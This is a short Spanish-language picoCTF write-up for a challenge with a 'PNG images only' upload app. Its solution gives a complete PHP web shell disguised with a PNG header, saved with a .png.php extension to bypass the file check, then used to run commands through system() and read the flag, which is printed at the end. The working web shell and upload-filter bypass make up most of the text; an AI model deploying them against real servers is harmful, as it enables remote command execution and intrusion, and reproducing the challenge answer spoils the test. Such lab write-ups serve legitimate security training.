I found a web app that can help process images: PNG images only!

Additional details will be available after launching your challenge instance.

Hints: no hay

## Solución
Hay que crear un script de php para hacer el engaño.
```
PNG  
<html>  
<body>  
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">  
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">  
<input type="SUBMIT" value="Execute">  
</form>  
<pre>  
<?php  
if(isset($_GET['cmd']))  
{  
system($_GET['cmd']);  
}  
?>  
</pre>  
</body>  
</html>
```

El archivo debe tener la extensión `.png.php`
Subirlo al servidor y luego entrar a `/uploads/<nombre>.png.php`.
De ahí hay que ejecutar el comando `find / -name *.txt` para buscar archivos posiblemente importantes. Hay que buscar el archivo que está en `/var/www/html` que tenga caracteres aleatorios y hacerle un `cat`.

`picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9}`